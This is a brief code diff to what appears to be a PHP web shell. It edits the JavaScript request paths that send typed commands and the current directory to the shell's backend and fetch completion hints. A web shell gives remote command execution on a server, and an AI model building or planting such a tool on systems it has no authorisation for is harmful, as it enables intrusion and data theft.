@@ -240,7 +240,7 @@ if (isset($_GET["feature"])) {
                     // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
                 } else {
-                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
+                    makeRequest("&feature=shell", {cmd: command, cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
                             featureDownload(response.name, response.file)
                         } else {
@@ -275,7 +275,7 @@ if (isset($_GET["feature"])) {
                 var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];
 
                 makeRequest(
-                    "?feature=hint",
+                    "&feature=hint",
                     {
                         filename: fileName,
                         cwd: CWD,
